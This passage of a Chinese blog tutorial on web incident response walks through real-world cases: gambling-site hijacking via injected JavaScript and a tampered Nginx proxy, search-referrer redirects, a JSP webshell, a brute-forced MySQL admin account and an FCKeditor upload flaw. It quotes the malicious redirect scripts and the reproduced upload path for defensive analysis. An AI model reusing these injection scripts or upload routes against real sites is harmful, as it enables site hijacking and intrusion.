2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面<br>
</p>


<figure id="orge14bd44">
<img src="./images/img_20230817_144532.png" alt="img_20230817_144532.png" width="60%"><br>

</figure>

<p>
3、然后清除IIS临时压缩文件<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD
</pre>
</div>


<figure id="org8dd81af">
<img src="./images/img_20230817_144557.png" alt="img_20230817_144557.png" width="60%"><br>

</figure>

<p>
4、删除相关的网页收录，减少对网站的影响。<br>
</p>
</div>
</div>
<div id="outline-container-h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d" class="outline-3">
<h3 id="h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d">新闻源网站劫持</h3>
<div class="outline-text-3" id="text-h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d">
<p>
新闻源网站一般权重较高，收录快，能够被搜索引擎优先收录，是黑灰产推广引流的必争之地，很容易成为被攻击的对象。被黑以后主要挂的不良信息内容主要是博彩六合彩等赌博类内容，新闻源网站程序无论是自主开发的还是开源程序，都有被黑的可能，开源程序更容易被黑。<br>
</p>

<p>
<b>现象描述：</b><br>
某新闻源网站首页广告链接被劫持到博彩网站<br>
</p>


<figure id="orge268d68">
<img src="./images/img_20230817_144639.png" alt="img_20230817_144639.png" width="60%"><br>

</figure>

<p>
有三个广告专题，链接形式如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.cn/zhuanti/yyysc/index.shtml
http://www.xxx.cn/zhuanti/wwwsc/index.shtml
http://www.xxx.cn/zhuanti/zzzsc/index.shtml
</pre>
</div>

<p>
点击这三条链接会跳转到博彩网站。简单抓包分析一下过程：<br>
</p>


<figure id="org42c25b4">
<img src="./images/img_20230817_144724.png" alt="img_20230817_144724.png" width="60%"><br>

</figure>

<p>
可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，<a href="http://xn--dpqw2zokj.com/N/js/dt.js">http://xn--dpqw2zokj.com/N/js/dt.js</a> ，进一步访问该文件：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">var <span style="color: #a0522d;">_hmt</span> = _hmt || [];
(<span style="color: #a020f0;">function</span>() {
     var <span style="color: #a0522d;">hm</span> = document.createElement(<span style="color: #8b2252;">"script"</span>);
     hm.src = <span style="color: #8b2252;">"https://hm.baidu.com/hm.js?5fa93dff27c1ac39be066ba260b14556"</span>;
     var <span style="color: #a0522d;">s</span> = document.getElementsByTagName(<span style="color: #8b2252;">"script"</span>)[0];
     s.parentNode.insertBefore(hm, s);
 })();

<span style="color: #0000ff;">document.writeln</span>(<span style="color: #8b2252;">"&lt;script language=\"javascript\" src=\"http://xn-- dpqw2zokj.com/N/js/yz.js\"&gt;&lt;\/script&gt;"</span>);
</pre>
</div>

<p>
dt.js进一步加载了另一条js，访问<a href="http://xn--dpqw2zokj.com/N/js/yz.js">http://xn--dpqw2zokj.com/N/js/yz.js</a><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">window.location=<span style="color: #8b2252;">"https://lemcoo.com/?dt"</span>;
</pre>
</div>

<p>
我们发现链接跳转到<a href="https://lemcoo.com/?dt">https://lemcoo.com/?dt</a> ，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。<br>
</p>

<p>
<b>问题处理：</b><br>
找到url对应的文件位置，删除。<br>
</p>

<p>
找到url对应的文件位置，即使文件被删除，链接依然可以访问，可以发现三条链接都是以“sc”后缀。<br>
</p>

<p>
对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到<a href="http://103.233.248.163">http://103.233.248.163</a> ，该网站为博彩链接导航网站。<br>
</p>


<figure id="orgec01a6f">
<img src="./images/img_20230817_145007.png" alt="img_20230817_145007.png" width="60%"><br>

</figure>

<p>
删除恶意代理后，专题链接访问恢复。<br>
</p>
</div>
</div>
<div id="outline-container-h:98272edc-c33e-4bcd-983c-c11c06aece65" class="outline-3">
<h3 id="h:98272edc-c33e-4bcd-983c-c11c06aece65">搜索引擎劫持</h3>
<div class="outline-text-3" id="text-h:98272edc-c33e-4bcd-983c-c11c06aece65">
<p>
当你直接打开网址访问网站，是正常的，可是当你在搜索引擎结果页中打开网站时，会跳转到一些其他网站，比如博彩，虚假广告，淘宝搜索页面等。是的，你可能了遇到搜索引擎劫持。<br>
</p>

<p>
从搜索引擎来的流量自动跳转到指定的网页<br>
</p>

<p>
通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。<br>
</p>


<figure id="orgf03688d">
<img src="./images/img_20230817_145033.png" alt="img_20230817_145033.png" width="60%"><br>

</figure>

<p>
进一步跟踪include函数包含的文件，index.php包含/tmp/.ICE-unix/.. /c.jpg。<br>
</p>


<figure id="orga80721f">
<img src="./images/img_20230817_145048.png" alt="img_20230817_145048.png" width="60%"><br>

</figure>

<p>
进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。<br>
</p>


<figure id="org5457222">
<img src="./images/img_20230817_145107.png" alt="img_20230817_145107.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61" class="outline-3">
<h3 id="h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61">网站首页被篡改</h3>
<div class="outline-text-3" id="text-h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61">
<p>
网站首页被非法篡改，当你一打开网站就知道自己的网站出现了安全问题，网站程序存在严重的安全漏洞，攻击者通过上传脚本木马，从而对网站内容进行篡改。而这种篡改事件在某些场景下的影响，会被无限放大。<br>
</p>

<p>
现象描述：网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。<br>
</p>

<p>
问题处理：<br>
确认篡改时间：通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。<br>
</p>

<p>
访问日志溯源：通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。<br>
</p>


<figure id="orgb66774e">
<img src="./images/img_20230817_145153.png" alt="img_20230817_145153.png" width="60%"><br>

</figure>

<p>
进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。<br>
</p>


<figure id="org6044622">
<img src="./images/img_20230817_145211.png" alt="img_20230817_145211.png" width="60%"><br>

</figure>

<p>
image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。<br>
</p>

<p>
<b>事件分析：</b><br>
</p>

<p>
发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-28 10:35<br>
</p>


<figure id="orgb8bce05">
<img src="./images/img_20230817_145252.png" alt="img_20230817_145252.png" width="60%"><br>

</figure>

<p>
通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）<br>
</p>


<figure id="org969f126">
<img src="./images/img_20230817_145306.png" alt="img_20230817_145306.png" width="60%"><br>

</figure>

<p>
根据这几个时间节点，我们尝试去还原攻击者的攻击路径，但是我们在访问日志并未找到ROOT.rar的访问下载记录，访问日志只保留了近一年的记录，而这个Webshell可能已经存在了多年。<br>
</p>

<p>
黑客是如何获取Webshell的呢？<br>
</p>

<p>
可能是通过下载ROOT.rar全站源码备份文件获取到其中存在的木马信息，或者几年前入侵并潜藏了多年，又或者是从地下黑产购买了shell，我们不得而知。该示例中攻击者为我们留下了大量的证据和记录，而更多时候，攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。<br>
</p>
</div>
</div>
<div id="outline-container-h:02bdb174-5393-4e67-8a8c-4c12cf841e13" class="outline-3">
<h3 id="h:02bdb174-5393-4e67-8a8c-4c12cf841e13">管理员账号被篡改</h3>
<div class="outline-text-3" id="text-h:02bdb174-5393-4e67-8a8c-4c12cf841e13">
<p>
使用环境：Windows Server 2008 + phpstudy + DVWA<br>
</p>

<p>
场景：管理员账号admin无法登录，进入数据库查看，原来管理员账号用户名不存在了，却多了另外一个管理员用户名，管理员账号被篡改了。<br>
</p>

<p>
管理员密码原本为admin/password<br>
</p>

<p>
某天管理员发现该账号已经无法登录<br>
</p>


<figure id="orgb70385d">
<img src="./images/img_20230817_145349.png" alt="img_20230817_145349.png" width="60%"><br>

</figure>

<p>
<b>日志分析：</b><br>
</p>

<p>
查看数据库访问日志，发现攻击者ip存在暴力破解行为<br>
cat /var/lib/mysql/a21ec98a8b54.log<br>
</p>


<figure id="orgb99674b">
<img src="./images/img_20230817_145411.png" alt="img_20230817_145411.png" width="60%"><br>

</figure>

<p>
发现在2022年4月28日，攻击者成功连接到mysql<br>
</p>


<figure id="orgc030e70">
<img src="./images/img_20230817_145424.png" alt="img_20230817_145424.png" width="60%"><br>

</figure>

<p>
登录数据库查询发现在对应时间段密码被修改为hacker。<br>
</p>


<figure id="org2a3e887">
<img src="./images/img_20230817_145441.png" alt="img_20230817_145441.png" width="60%"><br>

</figure>

<p>
<b>应急措施</b><br>
1、封禁IP地址<br>
2、修改管理员表密码字段为强口令<br>
3、修改mysql密码为强口令<br>
4、限制mysql外连<br>
</p>
</div>
</div>
<div id="outline-container-h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac" class="outline-3">
<h3 id="h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac">编辑器入侵事件</h3>
<div class="outline-text-3" id="text-h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac">
<p>
使用环境：Windows Servers 2008 + IIS + FCKeditor<br>
</p>

<p>
现象描述：防护设备发出预警：发现后门(Webshell)文件，建议立即进行处理。<br>
</p>


<figure id="orgfb2d938">
<img src="./images/img_20230817_145532.png" alt="img_20230817_145532.png" width="60%"><br>

</figure>

<p>
备注：紧急处理，通过禁止动态脚本在上传目录的运行权限，使Webshell无法成功执行。<br>
</p>

<p>
定位上传时间：根据Webshell文件创建时间，2022年4月28日 15:18:07<br>
</p>


<figure id="org75251ac">
<img src="./images/img_20230817_145550.png" alt="img_20230817_145550.png" width="60%"><br>

</figure>

<p>
<b>Web访问日志分析</b><br>
</p>

<p>
由于，IIS日志时间与系统时间相差8小时，系统时间是15:08，我们这里查看的是 6:59的日志时间。<br>
</p>

<p>
C:\inetpub\logs\LogFiles\W3SVC2\u_ex220428.log<br>
</p>


<figure id="orgaefd755">
<img src="./images/img_20230817_145620.png" alt="img_20230817_145620.png" width="60%"><br>

</figure>

<p>
找到对应的网站访问日志，在这段时间里我们发现攻击者访问了fck的文件上传地址<br>
<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a><br>
</p>


<figure id="org33b3734">
<img src="./images/img_20230817_145640.png" alt="img_20230817_145640.png" width="60%"><br>

</figure>

<p>
<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</a><br>
</p>


<figure id="org18cb57e">
<img src="./images/img_20230817_145656.png" alt="img_20230817_145656.png" width="60%"><br>

</figure>

<p>
<b>漏洞复现</b><br>
</p>

<p>
此处上传asp木马不成功<br>
</p>


<figure id="orgdebcdcc">
<img src="./images/img_20230817_145754.png" alt="img_20230817_145754.png" width="60%"><br>

</figure>

<p>
在test.html接口成功上传Webshell<br>
<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a><br>
</p>


<figure id="orge563bef">
<img src="./images/img_20230817_145821.png" alt="img_20230817_145821.png" width="60%"><br>

</figure>

<p>
<b>还原攻击者行为：</b> 通过相关文件的访问记录进行关联分析，攻击者通过 fckeditor编辑器的测试页面成功上传Webshell。<br>
</p>

<p>
<b>事件处理：</b><br>
1、删除Webshell：清除已发现的webshell，并尝试查找可能隐藏的webshell。<br>
2、代码完整性验证：我们来思考一个问题，如果有一个免杀的Webshell隐藏在数以万行的代码中，如<br>
何进行应急？&#x2013; 文件完整性校验，检查网站的源码是否被篡改过。<br>
操作过程：通过查看服务器上已部署的源代码版本，找研发同事要同样版本的代码。把纯净源码的所有文件计算一次hash值保存，再到服务器上执行一次hash值，通过比对hash值，输出新创建的/被修改过的/删除的文件列表。<br>
</p>

<p>
3、系统入侵排查：对系统做一个整体排查，确认是否存在后门<br>
4、代码修复：反馈给相关开发人员进行代码修复。<br>
</p>
</div>
</div>
</section>
<section id="outline-container-h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4" class="outline-2">
<h2 id="h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4">撰写应急响应报告</h2>
<div class="outline-text-2" id="text-h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4">
<p>
前面我们学习了应急响应技术和实战案例，运用到实际工作中时，需要按照流程执行。应急响应常见的6<br>
个阶段：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#20934;&#22791;&#38454;&#27573; Preparation
2&#12289;&#26816;&#27979;&#38454;&#27573; Detection
3&#12289;&#25233;&#21046;&#38454;&#27573; Control
4&#12289;&#26681;&#38500;&#38454;&#27573; Eradicate
5&#12289;&#24674;&#22797;&#38454;&#27573; Recovery
6&#12289;&#24635;&#32467;&#38454;&#27573; Follow
</pre>
</div>


<figure id="org8efb9ef">
<img src="./images/img_20230817_150014.png" alt="img_20230817_150014.png" width="60%"><br>

</figure>

<p>
在总结阶段，安全工程师需要针对突发事件撰写应急响应报告。通常会有如下两类场景：<br>
</p>

<p>
1、企业具备配套的应急响应管理制度和安全措施<br>
按照企业已有的方法模板撰写应急响应报告，报告内容要遵循应急响应PDCERF流程。<br>
</p>

<p>
2、企业不具备配套的应急响应管理制度和安全措施<br>
这类场景也是实际工作中比较多见的场景，企业不具备配套管理制度，面对突发事件时，缺乏指导能力。此时在撰写应急响应报告时，报告应包含下述内容：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#22522;&#26412;&#20449;&#24687;&#65306;&#24212;&#24613;&#26102;&#38388;&#12289;&#24212;&#24613;&#20154;&#21592;&#12289;&#24212;&#24613;&#20107;&#20214;&#31867;&#22411;&amp;&#32423;&#21035;&#31561;&#23458;&#35266;&#20449;&#24687;&#65292;&#26681;&#25454;&#23454;&#38469;&#36827;&#34892;&#22635;&#20889;

&#20107;&#20214;&#32972;&#26223;&#65306;&#20107;&#20214;&#21457;&#29983;&#26102;&#38388;&#12289;&#20107;&#20214;&#29616;&#35937;

&#22788;&#29702;&#36807;&#31243;&#65306;&#26816;&#27979;&#12289;&#25233;&#21046;&#12289;&#26681;&#38500;&#12289;&#24674;&#22797;&#38454;&#27573;&#30340;&#20855;&#20307;&#24037;&#20316;
&#65288;1&#65289;&#26816;&#27979;&#65306;&#26681;&#25454;&#20107;&#20214;&#29616;&#35937;&#21435;&#21040;&#29616;&#26377;&#23433;&#20840;&#35774;&#22791;&#20013;&#36827;&#34892;&#21578;&#35686;&#25490;&#26597;&#65292;&#25110;&#32773;&#20351;&#29992;&#24037;&#20855;&#36827;&#34892;&#26597;&#30475;&#20998;&#26512;
&#65288;2&#65289;&#25233;&#21046;&#65306;&#37319;&#21462;&#20020;&#26102;&#38450;&#25252;&#25163;&#27573;&#36827;&#34892;&#19994;&#21153;&#24674;&#22797;&#65292;&#38477;&#20302;&#24433;&#21709;&#33539;&#22260;
&#65288;3&#65289;&#26681;&#38500;&#65306;&#23450;&#20301;&#21040;&#25915;&#20987;&#21407;&#22240;&#21518;&#65292;&#37319;&#29992;&#38548;&#31163;&#12289;&#21024;&#38500;&#12289;&#37325;&#32622;&#31561;&#25163;&#27573;&#28165;&#38500;&#24694;&#24847;&#31243;&#24207;&#12289;&#38459;&#26029;&#25915;&#20987;&#26469;&#28304;
&#65288;4&#65289;&#24674;&#22797;&#65306;&#25163;&#24037;&#39564;&#35777;&#30830;&#20445;&#19994;&#21153;&#24674;&#22797;&#27491;&#24120;

&#20107;&#20214;&#32467;&#35770;&#65306;&#32463;&#25490;&#26597;&#21518;&#24471;&#20986;&#30340;&#20107;&#20214;&#21407;&#22240;&#12289;&#22788;&#32622;&#32467;&#26524;
&#23433;&#20840;&#24314;&#35758;&#65306;&#26681;&#25454;&#20107;&#20214;&#21407;&#22240;&#32473;&#20986;&#38450;&#25252;&#24314;&#35758;&#65292;&#36991;&#20813;&#21516;&#31867;&#20107;&#20214;&#20877;&#27425;&#21457;&#29983;
&#30456;&#20851;&#38468;&#20214;&#65306;&#30149;&#27602;&#26679;&#26412;&#12289;&#24322;&#24120;&#27969;&#37327;&#12289;&#24694;&#24847;&#31243;&#24207;&#31561;&#26448;&#26009;
</pre>
</div>
</div>
</section>
</main class="container">
<footer id="postamble" class="status">
<footer data-astro-cid-sz7xmlte data-turbo-permanent id=rootFooter>
    <script>
        const shuffle = e => e.map((e => ({
            v: e,
            sort: Math.random()
        }))).sort(( (e, o) => e.sort - o.sort)).map(( ({v: e}) => e));
        var songList = ["barbie-girl--stantough", "blue-da-ba-dee--cornelius-link", "hips-dont-lie--stantough", "i-want-it-that-way--stantough", "seven-nation-army--stantough", "smooth-criminal--stantough"]
          , songOrder = songOrder ?? shuffle(songList).map((e => `/audio/music/${e}.opus`))
          , song = new Audio(songOrder[0])
          , nextSong = new Audio(songOrder[1])
          , songIndex = 2
          , musicWrapper = void 0
          , arrow = void 0
          , notes = void 0;
        song.addEventListener("ended", next);
        const toggle = () => song.paused ? play() : pause();
        function play() {
            song.play(),
            musicWrapper = musicWrapper || document.getElementById("musicWrapper"),
            notes = notes || document.getElementById("notesWrapper"),
            musicWrapper.classList.add("shakeManHorse"),
            notes.classList.remove("hideNotes")
        }
        function pause() {
            song.pause(),
            musicWrapper = musicWrapper || document.getElementById("musicWrapper"),
            notes = notes || document.getElementById("notesWrapper"),
            musicWrapper.classList.remove("shakeManHorse"),
            notes.classList.add("hideNotes")
        }
        function next() {
            song = nextSong,
            play(),
            songIndex === songOrder.length && (songIndex = 0),
            nextSong = new Audio(songOrder[songIndex]),
            songIndex += 1
        }
        function skip() {
            pause(),
            (arrow = arrow || document.getElementById("musicArrow")).classList.add("shootArrow");
            new Audio("/audio/effects/ohno.m4a").play(),
            arrow.addEventListener("animationend", arrowShootHandler, !1)
        }
        function arrowShootHandler() {
            arrow.removeEventListener("animationend", arrowShootHandler, !1),
            arrow.classList.remove("shootArrow");
            new Audio("/audio/effects/heythathurt.m4a").play(),
            next()
        }
    </script>
    <div id=musicPlayer data-astro-cid-q7a5pyro>
        <button class=skip data-astro-cid-q7a5pyro onclick=skip() title="Skip song">
            <div id=skipWrapper data-astro-cid-q7a5pyro>
                <img alt="Medieval drollery of a man/snail/bat/monkey shooting an arrow" class=archer decoding=async height=334 loading=lazy src=/images/archer-no-arrow.448ccd8b_Z1KfRYq.webp width=226 data-astro-cid-q7a5pyro>
                <img alt="Arrow for archer" class="arrow complete" decoding=async height=23 loading=lazy src=/images/no-archer-full-arrow.87aa9971_Z2qL2KO.webp width=141 data-astro-cid-q7a5pyro id=musicArrow>
            </div>
        </button>
        <button class=playPause data-astro-cid-q7a5pyro onclick=toggle() title="Play/pause song">
            <div id=musicWrapper data-astro-cid-q7a5pyro>
                <div class=hideNotes id=notesWrapper data-astro-cid-q7a5pyro>
                    <div class=lyreNotes data-astro-cid-6gcrueho>
                        <div class=note1 data-astro-cid-6gcrueho>&#9835;&#9833;</div>
                        <div class=note2 data-astro-cid-6gcrueho>&#9833;</div>
                        <div class=note3 data-astro-cid-6gcrueho>&#9839;&#9834;</div>
                        <div class=note4 data-astro-cid-6gcrueho>&#9834;</div>
                    </div>
                    <div class=fluteNotes data-astro-cid-6gcrueho>
                        <div class=note1 data-astro-cid-6gcrueho>&#9835;&#9833;</div>
                        <div class=note2 data-astro-cid-6gcrueho>&#9833;</div>
                        <div class=note3 data-astro-cid-6gcrueho>&#9839;&#9834;</div>
                        <div class=note4 data-astro-cid-6gcrueho>&#9834;</div>
                    </div>
                </div>
                <img alt="Medieval drollery of a man/horse playing a lyre and a horn" class=manHorse decoding=async height=665 loading=lazy src=/images/man-horse-band.e3a2efcf_q8FCa.webp width=531 data-astro-cid-q7a5pyro>
            </div>
        </button>
    </div>
    <hr data-astro-cid-sz7xmlte>
    <div class=salutation data-astro-cid-gdmrbrho>
        <p data-astro-cid-gdmrbrho>
            <span class=flower2 data-astro-cid-gdmrbrho>A</span>
            <span class=smallcap data-astro-cid-gdmrbrho>pax vobiscum</span>
            <span class="flower2 wiggle" data-astro-cid-gdmrbrho id=leaf>a</span>
        </p>
    </div>
    <script>
        function animateLeafBlownHandler() {
            leaf.removeEventListener("animationend", animateLeafBlownHandler, !1),
            leaf.classList.remove("blownAway"),
            leaf.classList.add("wiggle")
        }
        function animateLeaf() {
            leaf = leaf ?? document.getElementById("leaf"),
            leaf.classList.remove("wiggle"),
            leaf.classList.add("blownAway"),
            leaf.addEventListener("animationend", animateLeafBlownHandler, !1)
        }
        document.getElementById("leaf").onclick = animateLeaf
    </script>


    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2024 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
